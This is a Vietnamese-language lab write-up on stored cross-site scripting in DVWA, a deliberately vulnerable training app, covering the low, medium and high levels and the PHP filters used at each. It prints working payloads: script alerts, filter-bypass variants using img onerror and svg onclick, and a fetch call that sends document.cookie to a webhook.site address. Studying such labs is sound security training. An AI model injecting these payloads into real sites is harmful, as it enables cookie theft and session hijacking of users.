
# Stored Cross Site Scripting (XSS) - DVWA

Mức độ: **LOW**, **MEDIUM**, **HIGH**

---

## 🔹 LEVEL: LOW

### 📌 Description:
Giao diện cho phép nhập vào 2 trường `name` và `message`.  
Khi nhập text bình thường → kết quả sẽ hiển thị lại dưới dạng label.

<img width="611" height="262" alt="image" src="https://github.com/user-attachments/assets/2c0f1faf-b410-4ab6-8aeb-643ff0af1240" />

---

### 🎯 Goals:
Tiêm được đoạn mã JavaScript để server xử lý (Stored XSS).

---

### 🔍 Phân tích:

- Source code **không hề lọc input** → `name` và `message` được đưa thẳng vào truy vấn `INSERT` để lưu vào database.
- Có giới hạn ký tự trong form HTML, nhưng có thể **bypass bằng Burp hoặc DevTools**.

<img width="602" height="190" alt="image" src="https://github.com/user-attachments/assets/d3b5aeec-ec4f-47a3-8a05-8500d0a3d2be" />

---

### 🧪 Thực hành:

Payload đơn giản:

```html
<script>alert("hacker lor da ghe tham")</script>
```

<img width="600" height="198" alt="image" src="https://github.com/user-attachments/assets/f43b6752-91a5-4a7c-a8b3-fba41e91f868" />


Kết quả: script thực thi bình thường.

Payload nâng cao:

```html
<script>
  fetch("https://webhook.site/your-id?cookie=" + document.cookie)
</script>
```

<img width="607" height="223" alt="image" src="https://github.com/user-attachments/assets/28345b1d-3e6f-460d-a782-7e247382338e" />


> 📡 Webhook.site hoặc server tự dựng trong Kali có thể dùng để nhận cookie từ client.

---

## 🔸 LEVEL: MEDIUM

### 📌 Description:
Giao diện giống level LOW, vẫn là 2 input `name` và `message`, nhưng **payload không còn hoạt động** như trước.

<img width="612" height="275" alt="image" src="https://github.com/user-attachments/assets/48d6d567-898a-47fa-869f-21883cd8b780" />

<img width="610" height="298" alt="image" src="https://github.com/user-attachments/assets/4daab3dc-3c9d-4cb3-b54a-b9e360a3a0c2" />

---

### 🎯 Goals:
Tiêm mã JS thành công vượt qua lớp lọc.

---

### 🔍 Phân tích:

- Kết quả hiển thị label gợi ý rằng đoạn HTML đã bị lọc.
- Source code cho thấy các bước lọc kỹ:

<img width="605" height="215" alt="image" src="https://github.com/user-attachments/assets/0503900d-1d55-4d0b-a292-f88aeeb48ad0" />

**Trường `message`:**
- `addslashes()` → thêm `\` trước ký tự đặc biệt.
- `strip_tags()` → loại bỏ thẻ HTML.
- `htmlspecialchars()` → mã hóa ký tự đặc biệt như `<`, `>`, `"`, `'`.

**Trường `name`:**
- Lọc ban đầu bằng:
```php
$name = str_replace('<script>', '', $name);
```

→ Xóa chuỗi `<script>` → chặn XSS cơ bản.

---

### 💡 Kỹ thuật bypass:

Một số ví dụ:

```html
<scr<script>ipt>
<ScRiPt>
<img src=x onerror=alert(1)>
<svg onclick=alert(1)>
```
<img width="610" height="177" alt="image" src="https://github.com/user-attachments/assets/04cdc06f-6e03-41de-963b-618ccdeaa0c2" />

<img width="612" height="186" alt="image" src="https://github.com/user-attachments/assets/dbf54ab6-897e-4c39-ab10-70feb0bf2bbc" />

<img width="605" height="212" alt="image" src="https://github.com/user-attachments/assets/35de6efd-0076-4fb1-9dc6-1b720948b915" />

<img width="606" height="212" alt="image" src="https://github.com/user-attachments/assets/687933c8-0c7f-4063-9e1d-688e57c5f026" />

---

## 🔺 LEVEL: HIGH

### 📌 Description:
Giao diện giống như các level trước.
<img width="604" height="270" alt="image" src="https://github.com/user-attachments/assets/a55d7d2d-fb6f-4003-a362-b5e47cba946c" />

---

### 🎯 Goals:
Tiêm đoạn mã JS thực thi thành công dù qua lớp lọc mạnh hơn.

---

### 🔍 Phân tích:

**Trường `name`** được lọc bằng regex:

```php
$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name);
```

→ Lọc toàn bộ biến thể của `<script>` → các kỹ thuật bypass trước không còn hiệu quả.

---

### 💡 Kỹ thuật thay thế:

Tuy nhiên ở level trước ta đã liệt kê ra 1 vài cách khác không sử dụng biến thể của từ Script mà vẫn tiêm JS để server xử lý nhưt:

```html
<img src=x onerror=alert(document.cookie)>
<svg onclick=alert(document.cookie)>
```
<img width="605" height="166" alt="image" src="https://github.com/user-attachments/assets/4d01a408-f4ef-4117-adf0-601da45c1850" />

<img width="605" height="241" alt="image" src="https://github.com/user-attachments/assets/ef62b601-42d7-4dbb-8c78-75f1eb0d9abd" />

<img width="605" height="290" alt="image" src="https://github.com/user-attachments/assets/7471227c-0a52-470c-a8de-45f16cd2de82" />

<img width="602" height="235" alt="image" src="https://github.com/user-attachments/assets/a963f310-31e6-4736-9208-0f6d44214a2a" />

→ Server xử lý bình thường nếu các thẻ không bị strip.

---

### ✅ Ghi chú:
- Các payload không dùng `<script>` vẫn có thể hoạt động nếu không bị lọc bởi `strip_tags()` hay `htmlspecialchars()`.
- Cần thử nhiều kiểu encode hoặc kỹ thuật HTML non-standard nếu bị chặn thêm.

